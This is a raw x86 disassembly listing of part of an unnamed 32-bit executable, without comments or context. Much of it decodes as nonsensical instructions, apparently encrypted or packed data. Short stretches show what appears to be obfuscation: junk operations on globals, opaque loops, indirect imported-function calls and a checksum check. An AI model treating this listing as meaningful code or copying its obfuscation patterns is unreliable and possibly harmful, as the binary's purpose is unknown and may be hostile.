  40317b:	inc    ebx
  40317c:	nop
  40317d:	in     eax,dx
  40317e:	inc    ebx
  40317f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403180:	add    dh,BYTE PTR [esi-0x7]
  403183:	mov    ds:0x7903c05b,al
  403188:	arpl   dx,bp
  40318a:	and    DWORD PTR [ebp-0x42],0xffffff8d
  40318e:	ins    BYTE PTR es:[edi],dx
  40318f:	ret    0x5b43
  403192:	or     esi,edi
  403194:	inc    ebx
  403195:	xchg   esi,eax
  403196:	repnz push ss
  403198:	push   es
  403199:	ds push 0x68
  40319c:	mov    edx,0xb0927124
  4031a1:	push   esp
  4031a2:	out    0xde,eax
  4031a4:	adc    eax,esp
  4031a6:	xchg   ecx,eax
  4031a7:	xor    bl,BYTE PTR [eax+0x76]
  4031aa:	repnz push edx
  4031ac:	mov    esp,0xb5d4b928
  4031b1:	mov    dh,0x3b
  4031b3:	not    BYTE PTR [eax-0x10789fbc]
  4031b9:	int    0xb8
  4031bb:	shl    BYTE PTR [edx],0x33
  4031be:	lds    edx,FWORD PTR [edi-0x42]
  4031c1:	rol    DWORD PTR [esi-0x33b50212],1
  4031c7:	pop    edx
  4031c8:	jg     0x403187
  4031ca:	repz daa 
  4031cc:	jmp    0x4031d0
  4031ce:	sar    BYTE PTR [edi-0x7f],1
  4031d1:	fdiv   st,st(5)
  4031d3:	loope  0x4031c5
  4031d5:	inc    eax
  4031d6:	loopne 0x40324b
  4031d8:	inc    ebp
  4031d9:	push   ebp
  4031da:	inc    ecx
  4031db:	adc    ebp,eax
  4031dd:	sar    ch,0xed
  4031e0:	dec    esi
  4031e1:	sub    al,0x29
  4031e3:	imul   esp,DWORD PTR [eax-0xf617553],0x78
  4031ea:	add    BYTE PTR [ecx-0x80],dl
  4031ed:	mov    edx,0xc6f524e9
  4031f2:	jno    0x4031e9
  4031f4:	test   al,0x2e
  4031f6:	repnz and dh,dh
  4031f9:	ds out 0x3c,eax
  4031fc:	push   ss
  4031fd:	mov    eax,0x1a23e09b
  403202:	sbb    BYTE PTR [edx+0x795d7611],bl
  403208:	sbb    BYTE PTR [eax+esi*1+0x69],bl
  40320c:	xor    eax,0x3fad4e61
  403211:	pop    ecx
  403212:	xchg   ecx,eax
  403213:	xchg   BYTE PTR [esi-0x4277f43e],bl
  403219:	daa    
  40321a:	repnz aad 0xb7
  40321d:	dec    esi
  40321e:	leave  
  40321f:	in     eax,dx
  403220:	mov    ecx,0xcfae99be
  403225:	cs jmp 0x899df774
  40322b:	stos   BYTE PTR es:[edi],al
  40322c:	mov    ecx,0xebee0d32
  403231:	std    
  403232:	cmp    ecx,DWORD PTR [ebp+0xdd8e6c6]
  403238:	adc    ebx,DWORD PTR [edi-0x7fc2a6d4]
  40323e:	sbb    edi,DWORD PTR [ebp-0x6d]
  403241:	xchg   ecx,eax
  403242:	(bad)  
  403243:	jmp    0x403271
  403245:	das    
  403246:	jmp    0x10747c5c
  40324b:	or     ecx,DWORD PTR [eax]
  40324d:	mov    ds:0x2ea90a69,eax
  403252:	adc    cl,ch
  403254:	cdq    
  403255:	in     al,0xa8
  403257:	arpl   WORD PTR [edx],cx
  403259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40325a:	mov    esp,0x84e361cd
  40325f:	xchg   esp,eax
  403260:	lods   al,BYTE PTR ds:[esi]
  403261:	test   eax,0xf8bf431c
  403266:	jmp    0x46bc:0xa2328602
  40326d:	push   ebp
  40326e:	and    dl,BYTE PTR [esi-0x4e325155]
  403274:	out    0x48,al
  403276:	mov    eax,0x8a38
  40327b:	xor    ax,WORD PTR [ecx+0x20]
  40327f:	mov    ecx,0x3afe
  403284:	and    DWORD PTR ds:0x43467b,0x434643
  40328e:	add    ax,cx
  403291:	mov    ecx,DWORD PTR ds:0x43468f
  403297:	xor    ecx,DWORD PTR ds:0x4345eb
  40329d:	mov    DWORD PTR ds:0x43468f,ecx
  4032a3:	movzx  eax,ax
  4032a6:	mov    ecx,DWORD PTR ds:0x43467f
  4032ac:	xor    DWORD PTR ds:0x434603,ecx
  4032b2:	mov    DWORD PTR [ebp-0xc],eax
  4032b5:	mov    ecx,DWORD PTR ds:0x43468f
  4032bb:	sbb    ecx,DWORD PTR ds:0x4346bf
  4032c1:	mov    DWORD PTR ds:0x43468f,ecx
  4032c7:	mov    BYTE PTR [ebp-0x1],0x7f
  4032cb:	lea    eax,[ebp-0x1]
  4032ce:	or     DWORD PTR ds:0x43468f,0x2e6e
  4032d8:	mov    DWORD PTR [ebp-0x10],eax
  4032db:	and    DWORD PTR ds:0x43470b,edi
  4032e1:	jmp    0x4036d6
  4032e6:	jo     0x4032d7
  4032e8:	inc    edi
  4032e9:	xchg   DWORD PTR [ecx-0x49],eax
  4032ec:	jo     0x4032d7
  4032ee:	jne    0x403366
  4032f0:	xchg   edx,eax
  4032f1:	or     dl,BYTE PTR [esi+edx*8-0x5b]
  4032f5:	fimul  DWORD PTR [ebx]
  4032f7:	adc    BYTE PTR [esi+0x7e],bh
  4032fa:	push   esi
  4032fb:	jns    0x40337b
  4032fd:	jle    0x403342
  4032ff:	lahf   
  403300:	push   edx
  403301:	aad    0x51
  403303:	and    BYTE PTR [edx+edx*1-0xb],0xa4
  403308:	mov    ebx,0x1031d7bb
  40330d:	stc    
  40330e:	xor    bl,0x71
  403311:	sub    ebx,ebp
  403313:	in     al,dx
  403314:	in     al,0x65
  403316:	inc    ebx
  403317:	rcl    BYTE PTR [eax+ebp*8+0x8],cl
  40331b:	imul   edx,esp,0xffffffb4
  40331e:	dec    edi
  40331f:	je     0x40337e
  403321:	lea    edi,[eax+ebp*1+0x10]
  403325:	sar    bh,cl
  403327:	jp     0x403397
  403329:	jae    0x4032b2
  40332b:	push   esp
  40332c:	push   ds
  40332d:	cmp    dl,cl
  40332f:	pop    ebx
  403330:	cs cdq 
  403332:	jo     0x403313
  403334:	mov    ecx,0x266d9c87
  403339:	mov    dl,0xf9
  40333b:	lock xor ebx,DWORD PTR [eax+0xc]
  40333f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403340:	mov    ah,0x77
  403342:	loopne 0x4032fd
  403344:	adc    BYTE PTR [ebp-0xfd76b92],dh
  40334a:	jl     0x4033b2
  40334c:	add    al,ch
  40334e:	and    DWORD PTR [ecx+0x3a5c7548],ebp
  403354:	fs fcmovnbe st,st(1)
  403357:	sbb    DWORD PTR [eax],eax
  403359:	(bad)  
  40335a:	cwde   
  40335b:	xor    eax,0x5fdc7467
  403360:	and    edx,DWORD PTR [eax]
  403362:	cmp    DWORD PTR [edx+0x76c491f4],edx
  403368:	fld    QWORD PTR [esi+0x31]
  40336b:	push   eax
  40336c:	fsubr  st,st(0)
  40336e:	in     al,0xef
  403370:	out    0xb9,al
  403372:	shl    esp,1
  403374:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403376:	sahf   
  403377:	dec    esp
  403378:	pop    ebp
  403379:	pop    ds
  40337a:	xchg   ebx,eax
  40337b:	mov    bl,0xcf
  40337d:	outs   dx,BYTE PTR ds:[esi]
  40337e:	std    
  40337f:	stos   DWORD PTR es:[edi],eax
  403380:	jne    0x4033eb
  403382:	ins    BYTE PTR es:[edi],dx
  403383:	pusha  
  403384:	imul   edi,DWORD PTR [esi-0x2d7a2e3b],0x471dbf6d
  40338e:	and    esp,ebp
  403390:	pop    ss
  403391:	xchg   edi,eax
  403392:	sti    
  403393:	leave  
  403394:	and    ah,ch
  403396:	fs call 0x4f11b550
  40339c:	in     al,0xcb
  40339e:	push   0xffffff85
  4033a0:	leave  
  4033a1:	mov    dh,0x6d
  4033a3:	aaa    
  4033a4:	add    bh,cl
  4033a6:	es scas eax,DWORD PTR es:[edi]
  4033a8:	icebp  
  4033a9:	fsubr  DWORD PTR [esi+esi*4]
  4033ac:	retf   
  4033ad:	push   ecx
  4033ae:	rol    BYTE PTR [ebx],cl
  4033b0:	pusha  
  4033b1:	out    0xf3,al
  4033b3:	mov    dl,0xf3
  4033b5:	inc    edx
  4033b6:	les    eax,FWORD PTR [ebx]
  4033b8:	cmc    
  4033b9:	stc    
  4033ba:	jnp    0x403374
  4033bc:	jae    0x403418
  4033be:	jns    0x403415
  4033c0:	and    ebx,edx
  4033c2:	jmp    0x93d2fc17
  4033c7:	push   edx
  4033c8:	push   edx
  4033c9:	mov    edx,0x13200855
  4033ce:	push   0xe4018f1e
  4033d3:	adc    al,bl
  4033d5:	or     dh,BYTE PTR [eax]
  4033d7:	jmp    0x403436
  4033d9:	imul   ebx,DWORD PTR [esi],0xf61ca3df
  4033df:	pop    eax
  4033e0:	test   al,0x32
  4033e2:	inc    esp
  4033e3:	test   al,0xb1
  4033e5:	cmp    ebx,esi
  4033e7:	nop
  4033e8:	fsubr  DWORD PTR [ebx-0x29]
  4033eb:	push   edi
  4033ec:	sbb    DWORD PTR [ebx],0x50f6ec8d
  4033f2:	or     eax,0x3ea7ab05
  4033f7:	xchg   ecx,eax
  4033f8:	or     cl,dh
  4033fa:	js     0x40345b
  4033fc:	fimul  WORD PTR [ecx]
  4033fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033ff:	out    dx,eax
  403400:	xor    dh,bh
  403402:	cli    
  403403:	in     al,0x27
  403405:	or     al,0x6f
  403407:	(bad)  
  403408:	call   0xa8af:0x62141962
  40340f:	data16 add al,0xbe
  403412:	inc    eax
  403413:	or     esp,DWORD PTR [ebp-0x45]
  403416:	adc    BYTE PTR [esi],bh
  403418:	iret   
  403419:	or     eax,0x607e8231
  40341e:	dec    ecx
  40341f:	enter  0x4e89,0xce
  403423:	xor    BYTE PTR [ebx-0x9456e49],al
  403429:	std    
  40342a:	cld    
  40342b:	ins    DWORD PTR es:[edi],dx
  40342c:	mov    ch,al
  40342e:	ins    BYTE PTR es:[edi],dx
  40342f:	cmp    DWORD PTR [edx+0x4f21841],ebp
  403435:	mov    ds:0xa6ea4777,al
  40343a:	in     al,dx
  40343b:	adc    dh,BYTE PTR [edi-0x2b]
  40343e:	pcmpgtd mm0,QWORD PTR [esi+edi*2]
  403442:	add    ah,0xf0
  403445:	pop    ss
  403446:	pop    esi
  403447:	push   esp
  403448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403449:	or     al,BYTE PTR [eax]
  40344b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40344c:	dec    ebp
  40344d:	and    al,0xf6
  40344f:	cmp    edx,ebx
  403451:	sbb    ebx,DWORD PTR [esi]
  403453:	xlat   BYTE PTR ds:[ebx]
  403454:	test   DWORD PTR [eax-0xaf3b53c],0x32d22858
  40345e:	mov    al,ds:0x6fc2d2c6
  403463:	xchg   ebx,eax
  403464:	rcr    BYTE PTR [eax+esi*4-0x6393c910],0x5a
  40346c:	xchg   ebx,eax
  40346d:	xor    DWORD PTR [edi+0x57d37649],edx
  403473:	data16 sahf 
  403475:	mov    ds:0x197446f6,al
  40347a:	add    al,0xfb
  40347c:	add    al,0x96
  40347e:	(bad)  
  403480:	pop    ebp
  403481:	dec    esi
  403482:	int    0xf8
  403484:	fstp   st(0)
  403486:	push   eax
  403487:	xor    ah,BYTE PTR [eax+0x35]
  40348a:	fisubr DWORD PTR [edi]
  40348c:	cmp    ecx,DWORD PTR [ecx+0x320f5e0e]
  403492:	outs   dx,DWORD PTR ds:[esi]
  403493:	cmp    DWORD PTR [ebx+edi*1],eax
  403496:	jo     0x403490
  403498:	pop    ebp
  403499:	loop   0x403493
  40349b:	adc    al,0x4a
  40349d:	out    0x77,eax
  40349f:	stos   BYTE PTR es:[edi],al
  4034a0:	fistp  WORD PTR [edx+0xab1a10e]
  4034a6:	adc    esi,ebx
  4034a8:	js     0x40349d
  4034aa:	adc    BYTE PTR [edi+0x0],0xb
  4034ae:	pop    ebx
  4034af:	or     bl,cl
  4034b1:	jmp    0x40345f
  4034b3:	ret    
  4034b4:	pop    esp
  4034b5:	lds    esi,FWORD PTR [edx-0x36]
  4034b8:	(bad)  
  4034b9:	in     eax,0x63
  4034bb:	jno    0x4034cb
  4034bd:	mov    eax,0x6770ec9a
  4034c2:	jno    0x4034a7
  4034c4:	add    DWORD PTR ss:[eax+0x33],ebp
  4034c8:	(bad)  
  4034c9:	or     dh,BYTE PTR [esi+ebx*1-0x32]
  4034cd:	xor    bl,bl
  4034cf:	xor    BYTE PTR [ebx-0x45],bl
  4034d2:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034d4:	push   ebp
  4034d5:	jmp    0x6bef1a91
  4034da:	adc    ebp,DWORD PTR [esp+ebp*2]
  4034dd:	ja     0x403525
  4034df:	xlat   BYTE PTR ds:[ebx]
  4034e0:	pop    ds
  4034e1:	jno    0x40347f
  4034e3:	mov    ebx,0xf90cb658
  4034e8:	stos   DWORD PTR es:[edi],eax
  4034e9:	mov    ebx,0xbf23d739
  4034ee:	add    bh,BYTE PTR [ecx+eiz*4]
  4034f1:	xchg   esi,edi
  4034f3:	ror    BYTE PTR [eax],0x7f
  4034f6:	xchg   DWORD PTR [esp+edi*8+0x68],esi
  4034fa:	ins    BYTE PTR es:[edi],dx
  4034fb:	or     eax,0x59dbbb61
  403500:	and    DWORD PTR [edx],ebx
  403502:	int    0x61
  403504:	fld    TBYTE PTR [edx+0x4c6d1413]
  40350a:	cmp    al,0xec
  40350c:	cmc    
  40350d:	mov    eax,ds:0xa37841fc
  403512:	inc    esp
  403513:	and    BYTE PTR [eax],cl
  403515:	mov    ebx,0x2d467149
  40351a:	or     BYTE PTR [eax],0xba
  40351d:	inc    eax
  40351e:	pop    ebp
  40351f:	gs push edx
  403521:	inc    eax
  403522:	rcr    BYTE PTR [esi],0x7b
  403525:	es pusha 
  403527:	stos   DWORD PTR es:[edi],eax
  403528:	push   ecx
  403529:	daa    
  40352a:	jbe    0x403532
  40352c:	aas    
  40352d:	mov    ebx,es
  40352f:	gs jo  0x4035b0
  403532:	jmp    0xb6d3:0xde40805
  403539:	imul   esi,DWORD PTR [ebx-0x15929001],0x3d
  403540:	pop    ds
  403541:	dec    ecx
  403542:	mov    cl,0xc
  403544:	(bad)  [ebp+eiz*4+0x4cdc490e]
  40354b:	mov    bl,0xf1
  40354d:	sbb    eax,0xf27f38ce
  403552:	in     eax,dx
  403553:	ds push edx
  403555:	mov    esp,0x5d0c9672
  40355a:	imul   ebp,DWORD PTR [eax+0x40df104e],0xf8e7c5bc
  403564:	jge    0x4034ec
  403566:	add    al,0xc7
  403568:	cmp    eax,0x6f3b847c
  40356d:	je     0x4035bb
  40356f:	xchg   ebx,eax
  403570:	add    DWORD PTR [esi],ebp
  403572:	sti    
  403573:	fwait
  403574:	pushf  
  403575:	inc    ebx
  403576:	mov    bh,0x65
  403578:	add    eax,0x7448de7
  40357d:	lods   al,BYTE PTR ds:[esi]
  40357e:	js     0x4035b9
  403580:	(bad)  
  403581:	shr    BYTE PTR [eax],cl
  403583:	addr16 test dl,bl
  403586:	nop
  403587:	aas    
  403588:	std    
  403589:	mov    esi,0x3f8e80f9
  40358e:	xchg   DWORD PTR [edi-0x45],edx
  403591:	xor    DWORD PTR [ebp+0x3b],0xce4241b9
  403598:	pop    es
  403599:	jge    0x4035dc
  40359b:	push   eax
  40359c:	(bad)  
  40359d:	mov    ds:0x696b77e,eax
  4035a2:	iret   
  4035a3:	loopne 0x403539
  4035a5:	add    ebx,ebp
  4035a7:	inc    esp
  4035a8:	les    ebp,FWORD PTR [ebp-0xe]
  4035ab:	jo     0x403610
  4035ad:	fcomp  st(1)
  4035af:	dec    esp
  4035b0:	sar    DWORD PTR [edi+0x67],0x8f
  4035b4:	and    BYTE PTR [edx+edx*1],al
  4035b7:	jg     0x4035ff
  4035b9:	aas    
  4035ba:	popf   
  4035bb:	test   eax,0x8b276db2
  4035c0:	push   ebp
  4035c1:	loope  0x403556
  4035c3:	push   esi
  4035c4:	xchg   edx,eax
  4035c5:	ins    BYTE PTR es:[edi],dx
  4035c6:	cmp    eax,0xa668cfd6
  4035cb:	or     al,0x43
  4035cd:	sub    al,0x8f
  4035cf:	lods   eax,DWORD PTR ds:[esi]
  4035d0:	mov    WORD PTR ds:0xe816867,?
  4035d6:	pop    esp
  4035d7:	inc    ecx
  4035d8:	sub    BYTE PTR [ebp+0x7ed2e173],bh
  4035de:	xor    dl,ch
  4035e0:	xor    BYTE PTR [esi-0x43b8a872],cl
  4035e6:	stc    
  4035e7:	adc    eax,0x645acdc8
  4035ec:	(bad)  
  4035ed:	sar    BYTE PTR [edi+0x4b],1
  4035f0:	cmp    esp,0xc048e34a
  4035f6:	mov    ch,0xbb
  4035f8:	dec    BYTE PTR [ebx+0x297b080c]
  4035fe:	test   al,0xd0
  403600:	pop    es
  403601:	out    dx,al
  403602:	inc    edi
  403603:	dec    ebp
  403604:	popf   
  403605:	or     BYTE PTR [edx-0x1],al
  403608:	sub    ch,BYTE PTR [ebx*1+0x71849783]
  40360f:	shl    BYTE PTR [ebx+0x3b0d0c50],0x6c
  403616:	hlt    
  403617:	(bad)  
  403618:	test   al,0x63
  40361a:	outs   dx,BYTE PTR ds:[esi]
  40361b:	sub    BYTE PTR [edx-0x3a],bl
  40361e:	bound  ebx,QWORD PTR [ebx+0x22]
  403621:	push   ebx
  403622:	and    ebp,DWORD PTR [ecx+0x10]
  403625:	sub    DWORD PTR [esi-0x9],0x1d
  403629:	jns    0x403645
  40362b:	mov    edi,cs
  40362d:	call   FWORD PTR [ecx+edi*8]
  403630:	(bad)  
  403631:	loope  0x40366b
  403633:	(bad)  
  403634:	mov    edi,0xc9f68da0
  403639:	dec    ebp
  40363a:	rol    DWORD PTR [ebx-0x6ab2541],cl
  403640:	add    BYTE PTR [edx+esi*1+0x8],bl
  403644:	or     eax,0x5abf2462
  403649:	jb     0x403622
  40364b:	mov    ecx,0x73cd6040
  403650:	mov    cl,BYTE PTR [ebx-0x656c2b9d]
  403656:	or     eax,0xe3ee4e7a
  40365b:	in     eax,0x4e
  40365d:	aam    0xe2
  40365f:	repnz outs dx,DWORD PTR ds:[esi]
  403661:	loop   0x4036d7
  403663:	jae    0x4036a6
  403665:	add    ebx,DWORD PTR [eax+eax*1+0x508459b4]
  40366c:	jp     0x4035f3
  40366e:	mov    ds:0xe7f60df9,al
  403673:	fwait
  403674:	scas   eax,DWORD PTR es:[edi]
  403675:	(bad)  
  403676:	push   esp
  403677:	add    esi,0x817e635a
  40367d:	inc    ebp
  40367e:	stos   DWORD PTR es:[edi],eax
  40367f:	jnp    0x4036ec
  403681:	cmp    edx,DWORD PTR [eax-0xb7ad66c]
  403687:	jmp    0x66c6:0x507b320b
  40368e:	sub    BYTE PTR [ebp+0x62],bh
  403691:	pushf  
  403692:	adc    edi,DWORD PTR [ecx-0x3898da28]
  403698:	mov    DWORD PTR [edi-0x40],0x887a304e
  40369f:	ret    
  4036a0:	pop    eax
  4036a1:	sbb    dh,ah
  4036a3:	xchg   esi,eax
  4036a4:	sbb    DWORD PTR [esi-0x368c46e9],edi
  4036aa:	popf   
  4036ab:	push   0x6c
  4036ad:	xor    DWORD PTR [edx+edx*8],0xb39ba3b9
  4036b4:	add    eax,0xeba7c1e2
  4036b9:	idiv   BYTE PTR [ecx]
  4036bb:	mov    ds:0x6e0228dd,eax
  4036c0:	stos   BYTE PTR es:[edi],al
  4036c1:	pop    eax
  4036c2:	push   eax
  4036c3:	je     0x4036e1
  4036c5:	sub    BYTE PTR [esi],0xfa
  4036c8:	sti    
  4036c9:	(bad)  
  4036cd:	ret    0xdc85
  4036d0:	fist   WORD PTR [ebp+0x55]
  4036d3:	iret   
  4036d4:	call   0xd8b:0xff458aa5
  4036db:	jmp    0x403722
  4036dd:	inc    ebx
  4036de:	add    BYTE PTR [ebx],bl
  4036e0:	or     eax,0x434707
  4036e5:	mov    DWORD PTR ds:0x4345eb,ecx
  4036eb:	mov    ecx,DWORD PTR [ebp-0x10]
  4036ee:	sbb    DWORD PTR ds:0x434713,0x563b
  4036f8:	xor    al,0x44
  4036fa:	add    DWORD PTR ds:0x4345fb,0xe00
  403704:	sub    al,0x3a
  403706:	or     DWORD PTR ds:0x4345f7,0x434707
  403710:	mov    BYTE PTR [ecx],al
  403712:	xor    DWORD PTR ds:0x434677,ecx
  403718:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  40371f:	and    DWORD PTR ds:0x434687,0x0
  403729:	jmp    0x40373d
  40372e:	xor    ecx,ecx
  403730:	xor    ecx,DWORD PTR ds:0x434687
  403736:	inc    ecx
  403737:	mov    DWORD PTR ds:0x434687,ecx
  40373d:	cmp    DWORD PTR ds:0x434687,0x18
  403744:	jae    0x40382f
  40374a:	cmp    DWORD PTR ds:0x434687,0x20
  403751:	jne    0x40376a
  403757:	push   0x446b
  40375c:	push   DWORD PTR [ebp-0xc]
  40375f:	push   0x8d79
  403764:	call   DWORD PTR ds:0x413278
  40376a:	jmp    0x40372e
  40376f:	mov    DWORD PTR ds:0x4346cb,0x14
  403779:	cmp    DWORD PTR ds:0x4346cb,0x0
  403780:	je     0x40382f
  403786:	cmp    DWORD PTR ds:0x4346cb,0xa
  40378d:	jne    0x4037a6
  403793:	push   0x695b
  403798:	push   0x23be
  40379d:	push   DWORD PTR [ebp-0x18]
  4037a0:	call   DWORD PTR ds:0x41327c
  4037a6:	cmp    DWORD PTR ds:0x4346cb,0xb
  4037ad:	jne    0x4037c0
  4037b3:	mov    ecx,DWORD PTR ds:0x4346cb
  4037b9:	dec    ecx
  4037ba:	mov    DWORD PTR ds:0x4346cb,ecx
  4037c0:	mov    ecx,DWORD PTR ds:0x4346cb
  4037c6:	dec    ecx
  4037c7:	mov    DWORD PTR ds:0x4346cb,ecx
  4037cd:	jmp    0x403779
  4037d2:	mov    DWORD PTR ds:0x4345e7,0x1c
  4037dc:	cmp    DWORD PTR ds:0x4345e7,0x0
  4037e3:	je     0x40382f
  4037e9:	cmp    DWORD PTR ds:0x4345e7,0xc
  4037f0:	jne    0x403801
  4037f6:	push   0x434849
  4037fb:	call   DWORD PTR ds:0x413334
  403801:	cmp    DWORD PTR ds:0x4345e7,0xd
  403808:	jne    0x40381b
  40380e:	mov    ecx,DWORD PTR ds:0x4345e7
  403814:	dec    ecx
  403815:	mov    DWORD PTR ds:0x4345e7,ecx
  40381b:	mov    ecx,DWORD PTR ds:0x4345e7
  403821:	dec    ecx
  403822:	mov    DWORD PTR ds:0x4345e7,ecx
  403828:	jmp    0x4037dc
  40382d:	xor    ecx,ecx
  40382f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  403836:	adc    eax,eax
  403838:	mov    eax,DWORD PTR [ebp-0x8]
  40383b:	mov    ecx,0x7510851
  403840:	push   esi
  403841:	adc    DWORD PTR ds:0x434687,edi
  403847:	xor    eax,ecx
  403849:	inc    DWORD PTR ds:0x43470b
  40384f:	mov    esi,0x327299
  403854:	sub    DWORD PTR ds:0x43464f,0x3953
  40385e:	add    eax,esi
  403860:	jmp    0x40387d
  403865:	not    DWORD PTR ds:0x434643
  40386b:	mov    dl,BYTE PTR [ebp-0x1]
  40386e:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403872:	mov    DWORD PTR ds:0x43464b,0x4a72
  40387c:	inc    eax
  40387d:	cmp    eax,0x40
  403880:	jb     0x403865
  403886:	mov    edx,DWORD PTR [ebp-0x8]
  403889:	mov    eax,DWORD PTR [ebp-0xc]
  40388c:	xor    edx,ecx
  40388e:	add    edx,esi
  403890:	cmp    edx,eax
  403892:	je     0x403ccd
  403898:	push   ebx
  403899:	push   edi
  40389a:	mov    edi,DWORD PTR [ebp+0x8]
  40389d:	mov    eax,0x8a38
  4038a2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4038a7:	mov    edi,0x3afe
  4038ac:	jmp    0x403ca1
  4038b1:	sbb    DWORD PTR [edx+0x31],0x6d5dfd54
  4038b8:	jae    0x4038d9
  4038ba:	(bad)  
  4038bb:	out    dx,al
  4038bc:	xchg   esi,eax
  4038bd:	jns    0x4038ea
  4038bf:	clc    
  4038c0:	cmp    BYTE PTR [ebx+0x13],ah
  4038c3:	jle    0x403943
  4038c5:	push   esi
  4038c6:	jns    0x403946
  4038c8:	jle    0x40391a
  4038ca:	shr    ch,cl
  4038cc:	lods   al,BYTE PTR ds:[esi]
  4038cd:	inc    ebx
  4038ce:	mov    eax,ds:0xca8aa77
  4038d3:	or     bl,0x6a
  4038d6:	ret    
  4038d7:	adc    eax,0xed3be3c6
  4038dc:	pushf  
  4038dd:	ret    0x6659
  4038e0:	mov    ds:0x44ec5579,al
  4038e5:	push   eax
  4038e6:	dec    edi
  4038e7:	sbb    DWORD PTR [edx-0x68caee01],0xffffffce
  4038ee:	sub    edi,DWORD PTR [edx+0x4323455e]
  4038f4:	imul   ecx,DWORD PTR [eax+esi*2+0x79],0x51df5ac5
  4038fc:	push   0x82428e90
  403901:	fwait
  403902:	int    0x4b
  403904:	mov    esi,0xeb947f99
  403909:	(bad)  
  40390a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40390b:	adc    BYTE PTR [eax+ecx*8],bh
  40390e:	add    eax,0xcd506923
  403913:	xchg   ebx,eax
  403914:	mov    bh,0x64
  403916:	or     al,0x46
  403918:	fsub   QWORD PTR [ecx]
  40391a:	or     edi,DWORD PTR [esi]
  40391c:	lods   eax,DWORD PTR ds:[esi]
  40391d:	and    al,0xe5
  40391f:	push   es
  403920:	push   0x9b6d1d68
  403925:	scas   al,BYTE PTR es:[edi]
  403926:	pop    edi
  403927:	in     eax,0xd2
  403929:	jne    0x40398a
  40392b:	icebp  
  40392c:	sbb    DWORD PTR [ecx-0x62],esp
  40392f:	push   ebp
  403930:	sub    bl,BYTE PTR [eax]
  403932:	and    ch,BYTE PTR [ebp+esi*1+0x49818b3]
  403939:	ja     0x40392d
  40393b:	xchg   edx,eax
  40393c:	and    edi,DWORD PTR [edi+0x2e]
  40393f:	adc    ebx,DWORD PTR [edx-0x22049d0]
  403945:	(bad)  
  403948:	(bad)  
  403949:	in     eax,0xef
  40394b:	sbb    eax,0x8de2a143
  403950:	jne    0x403953
  403952:	and    al,0x9f
  403954:	push   esp
  403955:	push   0x708e671d
  40395a:	data16 fwait
  40395c:	loop   0x4038fb
  40395e:	sbb    dh,BYTE PTR [edx+0x1e77899c]
  403964:	sub    BYTE PTR [ebp-0x29e72b3b],dl
  40396a:	rol    bl,0x48
  40396d:	mov    ch,0xe
  40396f:	test   al,0xb2
  403971:	add    al,0x6c
  403973:	or     al,0x55
  403975:	push   esi
  403976:	xchg   edx,eax
  403977:	outs   dx,BYTE PTR ds:[esi]
  403978:	vpmadcswd xmm1,xmm0,XMMWORD PTR [edx+0x4f],xmm0
  40397f:	sub    cl,BYTE PTR [edi+0x4]
  403982:	dec    edi
  403983:	cmp    al,0xf3
  403985:	add    al,0xed
  403987:	cld    
  403988:	push   esp
  403989:	sub    eax,0xaeb70bb7
  40398e:	inc    ebp
  40398f:	mov    ds:0x52824589,eax
  403994:	inc    eax
  403995:	ror    DWORD PTR [edi-0x391483cd],cl
  40399b:	(bad)  
  40399c:	adc    esi,DWORD PTR [edx+0xa1b0262]
  4039a2:	or     bl,cl
  4039a4:	ds mov bh,0x27
  4039a7:	inc    edx
  4039a8:	push   eax
  4039a9:	into   
  4039aa:	test   BYTE PTR [edi-0x7b20b029],ah
  4039b0:	jmp    0x594239c5
  4039b5:	sbb    edi,DWORD PTR [ebx+edx*8+0x3be2acb0]
  4039bc:	pop    eax
  4039bd:	test   DWORD PTR [eax+0x3c9ea3c2],ecx
  4039c3:	push   es
  4039c4:	lock xchg edx,eax
  4039c6:	xchg   esp,eax
  4039c7:	mov    edx,0x44ef6abb
  4039cc:	xor    bh,BYTE PTR [ebp-0x74]
  4039cf:	mov    ah,0x69
  4039d1:	je     0x4039e6
  4039d3:	jns    0x403992
  4039d5:	aas    
  4039d6:	xor    eax,0x8e7c037f
  4039db:	test   DWORD PTR [ecx-0x35ab02d],0x456ff2d8
  4039e5:	xchg   ecx,eax
  4039e6:	ret    0x79c
  4039e9:	rol    BYTE PTR [esp+eiz*8+0x48],cl
  4039ed:	call   DWORD PTR [eax]
  4039ef:	xor    dh,BYTE PTR [ebp-0x19f9514a]
  4039f5:	popa   
  4039f6:	xchg   ebx,eax
  4039f7:	gs sub al,cl
  4039fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039fb:	int    0x6b
  4039fd:	(bad)  
  4039fe:	sub    eax,0xbf81bb6c
  403a03:	cdq    
  403a04:	sub    bl,bh
  403a06:	outs   dx,BYTE PTR ds:[esi]
  403a07:	fsub   st,st(2)
  403a09:	cli    
  403a0a:	icebp  
  403a0b:	popf   
  403a0c:	fcomp  DWORD PTR [ebp+0x1aa8170b]
  403a12:	pushf  
  403a13:	repz std 
  403a15:	jge    0x4039b5
  403a17:	push   edx
  403a18:	inc    ebp
  403a19:	lods   eax,DWORD PTR ds:[esi]
  403a1a:	xor    ebp,0xb9688dec
  403a20:	mov    al,ds:0x68a7e85c
  403a25:	je     0x4039aa
  403a27:	jge    0x403a84
  403a29:	outs   dx,BYTE PTR ds:[si]
  403a2b:	cmp    eax,0xb3e94298
  403a30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a31:	add    ebx,edx
  403a33:	aam    0x8d
  403a35:	lods   eax,DWORD PTR ds:[esi]
  403a36:	in     al,dx
  403a37:	lahf   
  403a38:	repz add al,0xd3
  403a3b:	bound  edi,QWORD PTR [edi-0x47]
  403a3e:	jnp    0x4039d1
  403a40:	xchg   esp,eax
  403a41:	fld    TBYTE PTR [ebp-0x30]
  403a44:	sbb    esi,DWORD PTR [ebp-0x787c35ba]
  403a4a:	jnp    0x4039cf
